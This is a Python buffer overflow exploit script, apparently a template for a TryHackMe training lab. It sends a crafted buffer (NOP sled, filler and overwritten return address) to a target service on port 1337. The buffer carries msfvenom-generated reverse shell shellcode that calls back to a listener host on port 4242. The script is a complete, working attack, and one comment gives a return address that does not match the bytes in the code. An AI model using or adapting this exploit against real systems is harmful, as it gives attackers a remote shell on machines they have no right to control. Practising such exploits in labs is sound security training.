import socket
import sys

#
# opinfosec
# BoF Template for Overflow1 for TryHackMe oscp.exe
# https://github.com/opsec-infosec/BufferOverflow
#

# Bad Chars 0x00

# Reverse Shell
# msfvenom -p linux/x86/shell_reverse_tcp  LHOST=172.16.110.1 LPORT=4242 -b '\x00' -f c -v payload_shell
# linux/x86/shell_reverse_tcp

payload_shell = (
"\xd9\xe9\xba\xf2\x31\xab\xfb\xd9\x74\x24\xf4\x5b\x31\xc9"
"\xb1\x12\x31\x53\x17\x03\x53\x17\x83\x19\xcd\x49\x0e\xec"
"\xf5\x79\x12\x5d\x49\xd5\xbf\x63\xc4\x38\x8f\x05\x1b\x3a"
"\x63\x90\x13\x04\x49\xa2\x1d\x02\xa8\xca\x31\xe4\x24\x0b"
"\x22\x07\xb9\x1b\x20\x8e\x58\xab\x22\xc1\xcb\x98\x19\xe2"
"\x62\xff\x93\x65\x26\x97\x45\x49\xb4\x0f\xf2\xba\x15\xad"
"\x6b\x4c\x8a\x63\x3f\xc7\xac\x33\xb4\x1a\xae")

nop_sled = "\x90" * 16  # NOP Sled
filler = "A" * (1036 - ((len(nop_sled)) + len(payload_shell))) # Filler 1036 Bytes - nop sled Bytes - payload_shell
eip = "\x6f\x9b\x04\x08"    #0x625011af  Return Address JMP ESP

try:
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("172.16.110.135", 1337))
    buffer = nop_sled + payload_shell + filler + eip
    s.send(buffer.encode("latin-1"))
    s.close()

except Exception as ex:
    print ("Error: ", ex)
    sys.exit(1)

sys.exit(0)
